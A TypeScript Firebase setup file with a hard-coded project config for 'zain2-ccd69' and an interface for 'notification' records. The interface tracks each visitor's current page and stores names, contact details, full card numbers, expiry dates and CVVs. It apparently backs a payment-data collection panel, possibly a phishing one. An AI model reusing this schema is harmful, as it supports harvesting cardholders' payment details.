import { initializeApp, getApps, getApp } from "firebase/app";
import { getAuth } from "firebase/auth";
import { getFirestore } from "firebase/firestore";
import { getDatabase } from "firebase/database";

const firebaseConfig = {
  apiKey: "AIzaSyBmILFib2Ut63p1xXPUjJbsLlHdaKsvlGs",
  authDomain: "zain2-ccd69.firebaseapp.com",
  databaseURL: "https://zain2-ccd69-default-rtdb.firebaseio.com",
  projectId: "zain2-ccd69",
  storageBucket: "zain2-ccd69.firebasestorage.app",
  messagingSenderId: "333275867179",
  appId: "1:333275867179:web:ae2bf7bd2e9504921da26e",
  measurementId: "G-T2TQTKQ2TW"
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);

export { app, auth, db, database };

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}
